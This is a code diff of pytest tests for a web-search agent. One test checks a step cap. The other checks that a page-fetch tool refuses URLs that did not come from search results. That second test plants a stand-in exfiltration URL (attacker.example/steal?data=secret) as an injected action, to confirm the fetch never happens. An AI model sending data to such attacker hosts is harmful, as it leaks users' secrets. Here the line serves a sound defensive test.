@@ -24,4 +24,21 @@ def test_step_cap_holds(monkeypatch):
     monkeypatch.setitem(agent.Action.model_config["json_schema_extra"]["example"],
                         "args", {"keyword": "x"})
     monkeypatch.setattr(agent, "MAX_STEPS", 3)
-    agent.run("best crm for small agencies")   # would loop forever without the cap
+    from common.llm import LLM
+    calls = []
+    real = LLM.structured
+    monkeypatch.setattr(LLM, "structured", lambda self, *a, **k: calls.append(a[3].__name__) or real(self, *a, **k))
+    agent.run("best crm for small agencies")   # without MAX_STEPS only the run's call cap would stop it
+    assert calls.count("Action") == 3          # exactly MAX_STEPS loop steps, then the brief
+
+
+def test_fetch_page_only_accepts_urls_from_the_serp(monkeypatch):
+    ex = agent.Action.model_config["json_schema_extra"]["example"]
+    monkeypatch.setitem(ex, "tool", "fetch_page")
+    monkeypatch.setitem(ex, "args", {"url": "https://attacker.example/steal?data=secret"})
+    monkeypatch.setattr(agent, "MAX_STEPS", 2)
+    seen = []
+    real = agent.fetch_page
+    monkeypatch.setitem(agent.TOOLS, "fetch_page", lambda **kw: seen.append(kw) or real(**kw))
+    agent.run("best crm for small agencies")
+    assert seen == []                          # refused: that URL never came from search_serp
